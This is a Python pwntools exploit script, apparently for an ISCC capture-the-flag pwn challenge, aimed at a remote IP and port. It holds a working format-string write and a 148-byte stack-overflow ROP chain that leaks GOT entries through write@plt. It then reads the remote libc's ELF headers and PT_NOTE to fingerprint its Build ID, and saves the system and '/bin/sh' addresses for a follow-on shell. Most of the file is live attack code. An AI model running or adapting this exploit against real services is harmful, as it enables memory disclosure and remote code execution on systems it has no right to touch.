from pwn import *
import time
import json

context(arch='i386', os='linux', log_level='info')

elf = ELF('d:/iscc/pwn2/pwn_permission')

HOST = '39.96.193.120'
PORT = 10000

target_val_addr = 0x804c030
write_plt = elf.plt['write']
vuln_addr = elf.symbols['vuln']

GOT_START = 0x0804c00c
GOT_SIZE = 0x1c

GOT_MAP = {
    0x0804c00c: 'read',
    0x0804c010: 'printf',
    0x0804c014: 'puts',
    0x0804c018: '__libc_start_main',
    0x0804c01c: 'write',
    0x0804c020: 'setvbuf',
    0x0804c024: 'memset',
}

PUTS_OFFSET = 0x6d1e0

def make_rop_read(addr, size):
    payload = b'A' * 148
    payload += p32(write_plt)
    payload += p32(vuln_addr)
    payload += p32(1)
    payload += p32(addr)
    payload += p32(size)
    return payload

def recv_data(conn, label=""):
    try:
        time.sleep(1.5)
        data = conn.recv(timeout=3)
        return data
    except EOFError:
        log.warning(f"Connection closed {label}")
        return None

def drain(conn):
    try:
        conn.recv(timeout=1)
    except:
        pass

def main():
    print("=" * 70)
    print("READING BUILD ID FROM REMOTE LIBC")
    print("=" * 70)
    
    conn = remote(HOST, PORT)
    data = conn.recv(timeout=5)
    log.info(f"Banner: {data[:80]}")
    
    fmt_payload = b'%5c%6$na' + p32(target_val_addr)
    conn.send(fmt_payload)
    time.sleep(2)
    
    response = conn.recv(timeout=5)
    if b'Input' not in response:
        log.warning("vuln not triggered!")
        conn.close()
        return
    
    log.success("vuln triggered!")
    
    # Step 1: Dump GOT table
    print("\n[1] Dumping GOT table...")
    conn.send(make_rop_read(GOT_START, GOT_SIZE))
    got_data = recv_data(conn, "after GOT dump")
    
    if not got_data or len(got_data) < GOT_SIZE:
        log.warning("GOT dump failed!")
        conn.close()
        return
    
    leaked = {}
    for got_addr, func_name in GOT_MAP.items():
        offset = got_addr - GOT_START
        if offset + 4 <= len(got_data):
            value = u32(got_data[offset:offset+4])
            if 0xf7000000 < value < 0xf7ffffff:
                leaked[func_name] = value
    
    for name, addr in sorted(leaked.items(), key=lambda x: x[1]):
        low12 = addr & 0xfff
        print(f"  {name}: 0x{addr:08x} (low12: 0x{low12:03x})")
    
    libc_base = leaked['puts'] - PUTS_OFFSET
    print(f"\n  libc_base = 0x{libc_base:x}")
    
    drain(conn)
    
    # Step 2: Read ELF header
    print("\n[2] Reading ELF header from libc...")
    conn.send(make_rop_read(libc_base, 64))
    header_data = recv_data(conn, "after header read")
    
    if not header_data:
        conn.close()
        return
    
    elf_start = -1
    for i in range(len(header_data) - 3):
        if u32(header_data[i:i+4]) == 0x464c457f:
            elf_start = i
            break
    
    if elf_start < 0:
        log.warning("ELF magic not found in response!")
        log.info(f"Raw: {header_data[:40].hex()}")
        conn.close()
        return
    
    hdr = header_data[elf_start:]
    log.success(f"Found ELF header (offset {elf_start}, {len(hdr)} bytes)")
    
    e_phoff = u32(hdr[28:32])
    e_phentsize = u16(hdr[42:44])
    e_phnum = u16(hdr[44:46])
    print(f"  e_phoff=0x{e_phoff:x}, e_phentsize={e_phentsize}, e_phnum={e_phnum}")
    
    drain(conn)
    
    # Step 3: Read program headers
    print("\n[3] Reading program headers...")
    ph_addr = libc_base + e_phoff
    ph_size = e_phentsize * e_phnum
    conn.send(make_rop_read(ph_addr, ph_size))
    ph_data = recv_data(conn, "after ph read")
    
    if not ph_data or len(ph_data) < e_phentsize:
        log.warning("Program headers read failed!")
        conn.close()
        return
    
    log.info(f"Read {len(ph_data)} bytes of program headers")
    
    note_offset = None
    note_size = None
    
    for i in range(e_phnum):
        off = i * e_phentsize
        if off + e_phentsize > len(ph_data):
            break
        
        p_type = u32(ph_data[off:off+4])
        p_offset_val = u32(ph_data[off+4:off+8])
        p_vaddr = u32(ph_data[off+8:off+12])
        p_filesz = u32(ph_data[off+16:off+20])
        
        type_names = {0: "NULL", 1: "LOAD", 2: "DYNAMIC", 3: "INTERP", 4: "NOTE", 6: "PHDR", 0x6474e550: "GNU_EH_FRAME", 0x6474e551: "GNU_STACK", 0x6474e552: "GNU_RELRO", 0x6474e553: "GNU_PROPERTY"}
        tname = type_names.get(p_type, f"0x{p_type:x}")
        print(f"  PH[{i}]: type={tname}, offset=0x{p_offset_val:x}, vaddr=0x{p_vaddr:x}, filesz=0x{p_filesz:x}")
        
        if p_type == 4:
            note_offset = p_offset_val
            note_size = p_filesz
    
    if note_offset is None:
        log.warning("No PT_NOTE found!")
        conn.close()
        return
    
    drain(conn)
    
    # Step 4: Read PT_NOTE for Build ID
    print(f"\n[4] Reading PT_NOTE (offset=0x{note_offset:x}, size=0x{note_size:x})...")
    note_addr = libc_base + note_offset
    read_size = min(note_size, 256)
    conn.send(make_rop_read(note_addr, read_size))
    note_data = recv_data(conn, "after note read")
    
    if not note_data:
        log.warning("PT_NOTE read failed!")
        conn.close()
        return
    
    log.info(f"Read {len(note_data)} bytes of PT_NOTE")
    log.info(f"Raw: {note_data[:64].hex()}")
    
    build_id = None
    pos = 0
    while pos + 12 <= len(note_data):
        try:
            namesz = u32(note_data[pos:pos+4])
            descsz = u32(note_data[pos+4:pos+8])
            n_type = u32(note_data[pos+8:pos+12])
        except:
            break
        
        type_names_note = {1: "NT_VERSION", 2: "NT_HWCAP", 3: "NT_GNU_BUILD_ID", 4: "NT_GNU_GOLD_VERSION"}
        tname = type_names_note.get(n_type, f"0x{n_type:x}")
        print(f"  NOTE at pos {pos}: namesz={namesz}, descsz={descsz}, type={tname}")
        
        if n_type == 3 and namesz == 4 and descsz == 20:
            name_aligned = (namesz + 3) & ~3
            desc_start = pos + 12 + name_aligned
            
            if desc_start + descsz <= len(note_data):
                build_id = note_data[desc_start:desc_start+descsz].hex()
                print(f"  *** BUILD ID: {build_id} ***")
            else:
                print(f"  Build ID data truncated (need {desc_start+descsz}, have {len(note_data)})")
        
        name_aligned = (namesz + 3) & ~3
        desc_aligned = (descsz + 3) & ~3
        pos += 12 + name_aligned + desc_aligned
    
    if build_id:
        print("\n" + "=" * 70)
        print("BUILD ID COMPARISON:")
        print("=" * 70)
        print(f"  Remote Build ID: {build_id}")
        
        buildid_9_17 = "4b5331163fe94a3dfbf1df5969e5ef6bde73d461"
        buildid_9_18 = "6b70e7c571c0ee4df4a372d39b390829a4d5efdf"
        
        if build_id == buildid_9_17:
            print(f"\n  *** EXACT MATCH: libc6-i386_2.31-0ubuntu9.17_amd64 ***")
            exact_version = "libc6-i386_2.31-0ubuntu9.17_amd64"
        elif build_id == buildid_9_18:
            print(f"\n  *** EXACT MATCH: libc6-i386_2.31-0ubuntu9.18_amd64 ***")
            exact_version = "libc6-i386_2.31-0ubuntu9.18_amd64"
        else:
            print(f"\n  Build ID does not match 9.17 or 9.18!")
            print(f"  9.17 buildid: {buildid_9_17}")
            print(f"  9.18 buildid: {buildid_9_18}")
            exact_version = f"UNKNOWN (buildid: {build_id})"
        
        print(f"\n  Confirmed libc version: {exact_version}")
        print(f"  libc_base: 0x{libc_base:x}")
        print(f"  system offset: 0x41360, addr: 0x{libc_base + 0x41360:x}")
        print(f"  /bin/sh offset: 0x18c363, addr: 0x{libc_base + 0x18c363:x}")
        
        final_info = {
            'libc_id': exact_version,
            'buildid': build_id,
            'glibc_version': '2.31',
            'distro': 'Ubuntu 20.04 (focal)',
            'arch': 'i386 (32-bit)',
            'libc_base': hex(libc_base),
            'leaked': {k: hex(v) for k, v in leaked.items()},
            'offsets': {
                'system': hex(0x41360),
                'str_bin_sh': hex(0x18c363),
                'execve': hex(0xcd670),
                'dup2': hex(0xf1410),
                'puts': hex(0x6d1e0),
                'printf': hex(0x4fd30),
                'write': hex(0xf0830),
                'read': hex(0xf0790),
                '__libc_start_main': hex(0x1ade0),
                'setvbuf': hex(0x6d9c0),
                'memset': hex(0x14b3b0),
            },
            'addresses': {
                'system': hex(libc_base + 0x41360),
                'str_bin_sh': hex(libc_base + 0x18c363),
                'execve': hex(libc_base + 0xcd670),
                'dup2': hex(libc_base + 0xf1410),
                'puts': hex(libc_base + 0x6d1e0),
                'printf': hex(libc_base + 0x4fd30),
                'write': hex(libc_base + 0xf0830),
                'read': hex(libc_base + 0xf0790),
                '__libc_start_main': hex(libc_base + 0x1ade0),
                'setvbuf': hex(libc_base + 0x6d9c0),
                'memset': hex(libc_base + 0x14b3b0),
            }
        }
        
        with open('d:/iscc/pwn2/libc_info.json', 'w') as f:
            json.dump(final_info, f, indent=2)
        
        log.success(f"Exact libc info saved to libc_info.json")
    else:
        log.warning("Could not extract Build ID from PT_NOTE")
    
    conn.close()

if __name__ == '__main__':
    main()
